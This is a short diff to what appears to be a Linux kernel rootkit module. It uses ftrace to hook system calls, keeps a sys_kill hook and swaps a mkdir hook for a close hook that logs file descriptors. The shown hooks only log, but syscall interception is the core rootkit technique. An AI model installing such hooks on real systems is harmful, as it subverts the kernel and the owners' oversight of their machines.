@@ -60,13 +60,21 @@ static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
     return 0; /*everything is ok, but he new systemcall does nothing*/
 }
 
+
+static asmlinkage long (*original_close)(unsigned int fd);
+static asmlinkage long custom_close(unsigned int fd)
+{
+    printk("custom close: %d\n", fd);
+    return original_close(fd); /*everything is ok, but he new systemcall does nothing*/
+}
+
 #endif
 
 
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &original_kill),
-    HOOK("sys_mkdir", custom_mkdir, &original_mkdir),
+    HOOK("sys_close", custom_close, &original_close),
 };
 
 static int __init rootkit_init(void)
